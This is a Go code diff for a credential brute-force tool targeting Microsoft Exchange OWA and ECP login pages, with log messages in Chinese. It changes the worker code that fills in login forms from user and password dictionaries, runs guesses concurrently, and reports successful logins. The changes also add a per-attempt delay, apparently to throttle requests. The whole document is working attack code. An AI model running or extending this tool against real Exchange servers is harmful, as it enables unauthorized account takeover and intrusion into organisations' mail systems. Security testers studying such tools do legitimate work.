@@ -1,8 +1,6 @@
 package lib
 
 import (
-	"fmt"
-	"github.com/fatih/color"
 	"net/http"
 	"net/url"
 	"strings"
@@ -10,20 +8,21 @@ import (
 	"time"
 )
 
-func HttpBruteWorker(targetUrl string, mode string, u string, domain string, task chan []string) {
+func HttpBruteWorker(targetUrl string, mode string, u string, domain string, task chan []string, delay int) {
 
-	var refurl string
+	var refUrl string
 	if mode == "owa" {
-		refurl, _ = url.JoinPath(targetUrl, "/owa/")
+		refUrl, _ = url.JoinPath(targetUrl, "/owa/")
 	} else {
-		refurl, _ = url.JoinPath(targetUrl, "/ecp/")
+		refUrl, _ = url.JoinPath(targetUrl, "/ecp/")
 	}
-	referer, _ := url.JoinPath(targetUrl, "/owa/auth/logon.aspx?replaceCurrent=1&url="+refurl)
+	referer, _ := url.JoinPath(targetUrl, "/owa/auth/logon.aspx?replaceCurrent=1&url="+refUrl)
 
 	for data := range task {
 		username, password := data[0], data[1]
+		Log.Debug("[*] 尝试: %v:%v", username, password)
 		form := url.Values{
-			"destination":    {refurl},
+			"destination":    {refUrl},
 			"flags":          {"4"},
 			"forcedownlevel": {"0"},
 			"username":       {domain + "\\" + username},
@@ -42,20 +41,21 @@ func HttpBruteWorker(targetUrl string, mode string, u string, domain string, tas
 		location := res.Header.Get("Location")
 
 		if location == "" {
-			//color.Red("[-] 失败: %v", username+":"+password)
+			Log.Failed("[-] 失败: %v", username+":"+password)
 		} else if !strings.Contains(location, "reason") {
-			color.Green("[+] 成功: %v", username+":"+password)
+			Log.Success("[+] 成功: %v", username+":"+password)
 		} else {
-			//color.Red("[-] 失败: %v", username+":"+password)
+			Log.Failed("[-] 失败: %v", username+":"+password)
 		}
+		time.Sleep(time.Second * time.Duration(delay))
 	}
 }
 
-func HttpBruteRun(targetUrl string, mode string, domain string, userDict []string, passDict []string, n int) {
+func HttpBruteRun(targetUrl string, mode string, domain string, userDict []string, passDict []string, n int, delay int) {
 
 	authPath := ExchangeUrls[mode]
 	u, _ := url.JoinPath(targetUrl, authPath)
-	fmt.Println("[*] 使用", mode, "接口爆破:", targetUrl)
+	Log.Info("[*] 使用 %v 接口爆破: %v", mode, targetUrl)
 
 	task := make(chan []string, len(userDict)*len(passDict))
 
@@ -75,12 +75,12 @@ func HttpBruteRun(targetUrl string, mode string, domain string, userDict []strin
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			HttpBruteWorker(targetUrl, mode, u, domain, task)
+			HttpBruteWorker(targetUrl, mode, u, domain, task, delay)
 		}()
 	}
 
 	wg.Wait()
 
 	t2 := time.Now()
-	fmt.Println("[*] 耗时:", t2.Sub(t1))
+	Log.Info("[*] 耗时: %v", t2.Sub(t1))
 }
